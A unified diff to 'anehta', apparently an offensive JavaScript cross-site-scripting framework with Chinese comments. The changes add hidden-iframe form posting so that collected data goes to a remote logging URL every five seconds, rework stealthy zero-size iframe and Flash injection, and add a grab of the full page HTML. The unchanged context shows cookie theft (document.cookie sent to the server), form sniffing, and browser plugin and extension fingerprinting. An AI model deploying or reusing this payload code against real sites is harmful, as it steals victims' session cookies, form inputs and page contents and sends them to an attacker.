@@ -520,13 +520,34 @@ anehta.net.postForm = function(url){
 	f=document.createElement('form');	
 	f.action=url;
 	f.method="post";
-	//f.method="get";
 	document.getElementsByTagName("body")[0].appendChild(f);
 	f.submit();
 }
 
+// 向隐藏iframe提交表单
+//ifr 为iframe对象,由	ifr = anehta.inject.addIframe(""); 创建
+anehta.net.postFormIntoIframe = function(url, postdata, ifr){	
+	// 创建form
+	var f;
+	f=document.createElement('form');	
+	f.action=url;
+	f.method="post";
+	f.target=ifr.name; // 提交到iframe里	
+	
+	// 嵌套post数据，可选
+	if (typeof postdata != "undefined"){
+	  f.innerHTML = "<input type=hidden name='anehtaInput_" + ifr.name + 
+	                "' value=\"" + postdata + "\" \/>";
+	}
+	
+	document.getElementsByTagName("body")[0].appendChild(f);
+	f.submit();
+	//释放内存
+	setTimeout(function(){document.getElementsByTagName("body")[0].removeChild(f);}, 1000);
+}
 
-anehta.net.CSSGet = function(url){
+
+anehta.net.cssGet = function(url){
 	var cssget = {};
 	var s, e;
   if(document.createStyleSheet) {
@@ -581,7 +602,7 @@ anehta.logger.logCookie = function(){
 	            XssInfo_S+"Request URI: "+escape(window.location.href)+XssInfo_E+ // 获取当前URI
               XssInfo_S+"Cookie: "+escape(document.cookie)+XssInfo_E ;  //获取当前cookie
 	
-  param = anehta.crypto.base64encode(param); // base64 加密参数传输; 使用base64加密对性能影响很大
+  param = anehta.crypto.base64Encode(param); // base64 加密参数传输; 使用base64加密对性能影响很大
   //alert(param);
   // 发送cookie 和 uri 回 server
   anehta.net.getURL(logurl+param);
@@ -612,7 +633,7 @@ anehta.logger.logForm = function(o) {
 	// 记录提交的参数到远程服务器
 	param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
 	        XssInfo_S + "Form Sniffer: " + escape(param) + XssInfo_E;
-	param = anehta.crypto.base64encode(param); //base64时候对时间影响太大,会导致还没发包就页面跳转,从而出错
+	param = anehta.crypto.base64Encode(param); //base64时候对时间影响太大,会导致还没发包就页面跳转,从而出错
 	//alert(param);
 	
 	var img = document.createElement("IMG");
@@ -630,6 +651,15 @@ anehta.logger.logForm = function(o) {
 anehta.logger.logCache = function(){
 	var interval = 5000; // 检查的频率
 	var cache_tmp = "";
+	//alert(1);
+	//需要加载一个定制的iframe
+	var dd = document.createElement('div');
+	var ifrname = "anehtaPostLogger";//生成一个随机的name
+	dd.innerHTML = "<iframe id='" + ifrname + "' name='" + ifrname + "' width=0 height=0 ></iframe>";
+	document.getElementsByTagName('body')[0].appendChild(dd);
+	var ifr = document.getElementById(ifrname);
+
+	
 	setInterval(function(){		
 		// 正常记录cache里数据
 		var keys = anehtaCache.showKeys();
@@ -644,10 +674,18 @@ anehta.logger.logCache = function(){
 		    if(cache != cache_tmp){ // 有变化才发送,没有变化不发送
 		    //if(cache != ""){ // 有记录才发送,没有记录不发送
 		    	try {
+		    		
+		    		cache_tmp = cache; // 把当前cache保存在cache_tmp 中
 		    		// 如果cache太长会导致请求失败
-		        anehta.logger.logInfo(cache); 
-		        //anehtaCache.clear(); 
-		        cache_tmp = cache; // 把当前cache保存在cache_tmp 中
+		        //anehta.logger.logInfo(cache); 
+		        
+		        // 所以使用post发送数据
+		        cache = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+                    XssInfo_S + "Info: " + cache + XssInfo_E;
+	          cache = escape(cache);
+		        anehta.net.postFormIntoIframe(logurl, cache, ifr);
+		        
+		        //anehtaCache.clear(); 		        
 		      } catch (e) {
 		      	//alert(e);
 		      }
@@ -656,6 +694,8 @@ anehta.logger.logCache = function(){
 	  },
 	  interval);
 }
+
+
 
 
 //////////////////////////////////////////////////
@@ -818,7 +858,7 @@ if (xmlhttp.init()) {
 */
 
 // 初始化AJAX
-var xmlhttp = new anehta.ajax.XmlHttp();
+var anehtaXmlHttp = new anehta.ajax.XmlHttp();
 
 // 重新封装POST/GET  返回数据写在cache中
 /*
@@ -828,7 +868,7 @@ var xmlhttp = new anehta.ajax.XmlHttp();
 */
 anehta.ajax.post = function(url, param){ 
   // 第二个参数是提交的参数,第三个参数是headers
-	xmlhttp.post(url, param, null, function(response, responseHeaders) {
+	anehtaXmlHttp.post(url, param, null, function(response, responseHeaders) {
 		 if (responseHeaders != null) {
 			 //alert(responseHeaders);
 			 anehtaCache.setItem("ajaxPostResponseHeaders", responseHeaders);
@@ -844,7 +884,7 @@ anehta.ajax.post = function(url, param){
 
 anehta.ajax.get = function(url){
   // 第二个参数是headers
-	xmlhttp.get(url, null, function(response, responseHeaders) {
+	anehtaXmlHttp.get(url, null, function(response, responseHeaders) {
 		if (responseHeaders != null) {
 			//alert(responseHeaders);
 			anehtaCache.setItem("ajaxGetResponseHeaders", responseHeaders);
@@ -888,9 +928,29 @@ anehta.inject.injectCSS = function(ptr_sc){
 	return c;
 }
 
-anehta.inject.addIframe = function(srcurl){
-	document.write("<iframe src='" + srcurl + "' width=0 height=0 ></iframe>");
+anehta.inject.injectIframe = function(remoteurl) {
+	var newIframe = document.createElement("iframe");
+  var ts = new Date();
+	newIframe.id = "anehtaIframe"+ts.getTime(); //生成一个随机的name
+	newIframe.name = newIframe.id;  // IE中似乎加不上name属性
+	newIframe.style.width = 0;
+	newIframe.style.height = 0;
+	newIframe.src = remoteurl;
+	document.body.appendChild(newIframe);
+	return newIframe;	
 }
+
+anehta.inject.addIframe = function(srcurl){
+	var dd = document.createElement('div');
+	var ts = new Date();
+	var ifrname = "anehtaIframe"+ts.getTime(); //生成一个随机的name
+	dd.innerHTML = "<iframe id='" + ifrname + "' name='" + ifrname + "' src='" +
+	               srcurl + "' width=0 height=0 ></iframe>";
+	               
+  document.getElementsByTagName('body')[0].appendChild(dd);
+  return document.getElementById(ifrname);
+}
+
 
 anehta.inject.createIframe = function(w) {
 	var d = w.document;
@@ -908,23 +968,27 @@ anehta.inject.injectScriptIntoIframe = function(f, proc) {
 	d.write(s);
 }
 
-anehta.inject.injectIframe = function(remoteurl) {
-	var newIframe = $d.createElement("iframe");
-	newIframe.style.width = 0;
-	newIframe.style.height = 0;
-	newIframe.src = remoteurl;
-	$d.body.appendChild(newIframe);
-	return newIframe;	
-}
 
 anehta.inject.injectFlash = function(flashId, flashSrc, flashParam) {
 	//flashParam = '?' + flashParam;
+	/*
 	document.write('<object type="application/x-shockwave-flash" data="' + flashSrc +
 	         '" width="0" height="0" id="' + flashId +
 	         '"><param name="allowScriptAccess" value="always" /> ' +
 	         '<param name="movie" value="' + flashSrc + '" />' +
 	         '<PARAM NAME=FlashVars VALUE="domainAllowed=' + flashParam + '" />' +
 	         '<param name="bgColor" value="#fff" /> </object>');	
+	         */
+	     
+	var f = document.createElement('div');         
+	f.innerHTML = '<object type="application/x-shockwave-flash" data="' + flashSrc +
+	              '" width="0" height="0" id="' + flashId +
+	              '"><param name="allowScriptAccess" value="always" /> ' +
+	              '<param name="movie" value="' + flashSrc + '" />' +
+	              '<PARAM NAME=FlashVars VALUE="domainAllowed=' + flashParam + '" />' +
+	              '<param name="bgColor" value="#fff" /> </object>';
+	document.getElementsByTagName('body')[0].appendChild(f);
+	return f;
 }
 
 anehta.inject.injectApplet = function() {
@@ -1160,6 +1224,7 @@ anehta.detect.screenSize = function(){
 	var screenSize = new Array();
 	screenSize[0] = screen.width;
   screenSize[1] = screen.height;
+  anehtaCache.setItem("screenSize", screenSize[0]+"x"+screenSize[1]);
   return screenSize;
 }
 
@@ -1257,7 +1322,7 @@ anehta.detect.ffplugin = function(pluginName){
 
 
 // 通过图片的状态检查是否存在ff扩展; extname需要是anehta.signatures.ffextensions中的
-anehta.detect.ffextension = function (extname){
+anehta.detect.ffExtension = function (extname){
 
 }
 
@@ -1285,7 +1350,7 @@ anehta.scanner.activex = function(){
 }
 
 // 扫描Firefox 插件
-anehta.scanner.ffplugins = function (){  
+anehta.scanner.ffPlugins = function (){  
 	if (anehtaBrowser.type() == "mozilla"){ 
     for (var i = 0; i < navigator.plugins.length; i++) {
   	  // 用"|"作为分隔符
@@ -1313,7 +1378,7 @@ anehta.scanner.imgCheck = function(imgurl){
 }
 
 //扫描 Firefox 扩展
-anehta.scanner.ffextensions = function (){
+anehta.scanner.ffExtensions = function (){
 	for (var i = 0; i < anehta.signatures.ffextensions.length; i++){
 		//alert(anehta.signatures.ffextensions[i].url);
     anehta.scanner.imgCheck(anehta.signatures.ffextensions[i].url);
@@ -1434,6 +1499,10 @@ anehta.misc.setClipboard = function(data){
   return false;
 }
 
+anehta.misc.getCurrentPage = function(){
+	return document.childNodes[0].innerHTML;
+}
+
 
 
 //////////////////////////////////////////////////
@@ -1463,7 +1532,7 @@ var base64DecodeChars = new Array(
     -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
     41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
 
-anehta.crypto.base64encode = function(str) {
+anehta.crypto.base64Encode = function(str) {
     var out, i, len;
     var c1, c2, c3;
     len = str.length;
@@ -1496,7 +1565,7 @@ anehta.crypto.base64encode = function(str) {
     return out;
 }
 
-anehta.crypto.base64decode = function(str) {
+anehta.crypto.base64Decode = function(str) {
     var c1, c2, c3, c4;
     var i, len, out;
     len = str.length;
